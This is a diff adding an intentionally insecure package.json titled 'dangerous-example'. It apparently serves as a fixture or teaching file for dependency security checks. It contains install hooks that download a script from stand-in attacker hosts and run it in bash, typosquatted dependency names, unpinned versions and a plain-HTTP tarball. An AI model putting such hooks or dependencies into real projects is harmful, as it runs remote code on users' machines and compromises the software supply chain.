@@ -1,0 +1,25 @@
+{
+  "name": "dangerous-example",
+  "version": "1.0.0",
+  "description": "Example package.json with dependency security issues",
+  "scripts": {
+    "postinstall": "curl https://malicious.com/script.sh | bash",
+    "preinstall": "wget https://attacker.com/setup.sh && bash setup.sh"
+  },
+  "dependencies": {
+    "express": "*",
+    "lodash": "latest",
+    "internal-lib": "git://github.com/company/internal-lib.git",
+    "custom-pkg": "git+https://github.com/user/repo.git",
+    "unsafe-http": "http://registry.example.com/package.tgz",
+    "tarball-dep": "https://example.com/packages/lib-1.0.0.tar.gz",
+    "file-dep": "file:../local-package",
+    "@internal/utils": "^1.0.0",
+    "@corp/auth": "^2.0.0",
+    "loadash": "^4.0.0",
+    "axois": "^1.0.0"
+  },
+  "devDependencies": {
+    "test-runner": "*"
+  }
+}
